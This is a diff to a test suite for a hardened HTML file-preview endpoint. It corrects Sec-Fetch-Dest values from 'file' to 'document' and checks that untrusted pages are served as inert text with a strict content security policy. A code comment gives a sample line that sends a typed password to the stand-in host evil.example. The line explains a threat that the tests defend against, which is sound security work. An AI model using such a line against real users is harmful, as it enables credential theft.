@@ -357,8 +357,8 @@ describe("GET /preview/files/:id — hardened HTML preview", () => {
     // contained: a sandboxed navigable may always navigate ITSELF, so the page
     // can BE a fake login form and exfiltrate what is typed into it via
     // `location = "https://evil.example/?p=" + password`. Only a proven
-    // nested-file load is served as active HTML.
-    const degraded = ["file", "empty", "object", "embed"] as const;
+    // nested-document load is served as active HTML.
+    const degraded = ["document", "empty", "object", "embed"] as const;
 
     for (const dest of degraded) {
       it(`degrades to inert text/plain source for Sec-Fetch-Dest: ${dest}`, async () => {
@@ -373,13 +373,13 @@ describe("GET /preview/files/:id — hardened HTML preview", () => {
         expect(res.headers.get("x-content-type-options")).toBe("nosniff");
         expect(res.headers.get("content-security-policy")).toContain("default-src 'none'");
         // No script-src grant at all on the inert policy — and no sandbox
-        // either: nothing is parsed as a file, so there is nothing to
+        // either: nothing is parsed as a document, so there is nothing to
         // put in an opaque origin.
         expect(res.headers.get("content-security-policy")).not.toContain("unsafe-inline");
         expect(res.headers.get("content-security-policy")).not.toContain("sandbox");
         expect(res.headers.get("vary")).toBe("Sec-Fetch-Dest");
         // The source is still readable (the token holder could download it
-        // anyway) — it is simply never parsed as a file, so the meta CSP
+        // anyway) — it is simply never parsed as a document, so the meta CSP
         // injection does not even happen.
         const body = await res.text();
         expect(body).toContain("<html>");
@@ -405,7 +405,7 @@ describe("GET /preview/files/:id — hardened HTML preview", () => {
       const token = mintToken(docId, ctx.orgId, nowSec() + 300);
       await withEnv("USERCONTENT_URL", "https://usercontent.example", async () => {
         // Top-level navigation, and the same request with the header absent.
-        const headerSets: Record<string, string>[] = [{ "Sec-Fetch-Dest": "file" }, {}];
+        const headerSets: Record<string, string>[] = [{ "Sec-Fetch-Dest": "document" }, {}];
         for (const headers of headerSets) {
           const res = await app.request(`/preview/files/${docId}?t=${encodeURIComponent(token)}`, {
             headers,
@@ -448,7 +448,7 @@ describe("GET /preview/files/:id — hardened HTML preview", () => {
       const docId = await seedDoc(ctx, { mime: "text/markdown", body: "# hi" });
       const token = mintToken(docId, ctx.orgId, nowSec() + 300);
       const res = await app.request(`/preview/files/${docId}?t=${encodeURIComponent(token)}`, {
-        headers: { "Sec-Fetch-Dest": "file" },
+        headers: { "Sec-Fetch-Dest": "document" },
       });
       expect(res.status).toBe(200);
       expect(res.headers.get("content-type")).toBe("text/plain; charset=utf-8");
